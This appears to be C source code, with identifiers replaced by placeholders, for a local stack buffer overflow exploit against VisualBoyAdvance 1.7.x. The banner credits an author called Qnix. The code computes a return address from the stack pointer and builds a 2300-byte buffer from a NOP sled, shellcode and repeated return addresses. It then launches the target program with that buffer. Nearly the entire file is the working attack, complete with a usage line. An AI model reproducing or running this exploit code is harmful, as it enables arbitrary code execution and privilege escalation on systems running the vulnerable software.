
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int FUNC_0 (char*,char*,char*,int ) ;
 int FUNC_1 (char*) ;
 char* FUNC_2 (int) ;
 int FUNC_3 (char*,...) ;
 int * VAR_0 ;
 long FUNC_4 () ;
 int FUNC_5 (int *) ;

int FUNC_6(int VAR_1, char *VAR_2[])
{
  int VAR_3, VAR_4;
  long VAR_5, VAR_6, *VAR_7;
  char *VAR_8, *VAR_9;

  VAR_4 = 0;
  VAR_5 = FUNC_4();
  VAR_6 = VAR_5 - VAR_4;

if (VAR_1 >= 2) {
FUNC_3("\n ************************************************ \n");
FUNC_3(" VisualBoyAdvanced 1.7.x BufferOver Flow exploit \n");
FUNC_3("            by Qnix[at]bsdmail[dot]org      ");
FUNC_3("\n ************************************************ \n\n");
FUNC_3("[~] Stack pointer (ESP) : 0x%x\n", VAR_5);
FUNC_3("[~] Offset from ESP     : 0x%x\n", VAR_4);
FUNC_3("[~] Desired Return Addr : 0x%x\n\n", VAR_6);
} else {
FUNC_3("\n ************************************************ \n");
FUNC_3(" VisualBoyAdvanced 1.7.x BufferOver Flow Exploit \n");
FUNC_3("            by Qnix[at]bsdmail[dot]org      ");
FUNC_3("\n ************************************************ \n\n");
FUNC_3("useage : ./vba-exp <VisualBoyAdvanced File> \n\n");
}

VAR_8 = FUNC_2(2300);

VAR_9 = VAR_8;
VAR_7 = (long *) VAR_9;
for(VAR_3=0; VAR_3 < 2300; VAR_3+=4)
{ *(VAR_7++) = VAR_6; }

for(VAR_3=0; VAR_3 < 1900; VAR_3++)
{ VAR_8[VAR_3] = '\x90'; }

VAR_9 = VAR_8 + 1900;
for(VAR_3=0; VAR_3 < FUNC_5(VAR_0); VAR_3++)
{ *(VAR_9++) = VAR_0[VAR_3]; }

VAR_8[2300-1] = 0;

FUNC_0(VAR_2[1],"VisualBoyAdvance",VAR_8,0);

FUNC_1(VAR_8);

  return 0;
}
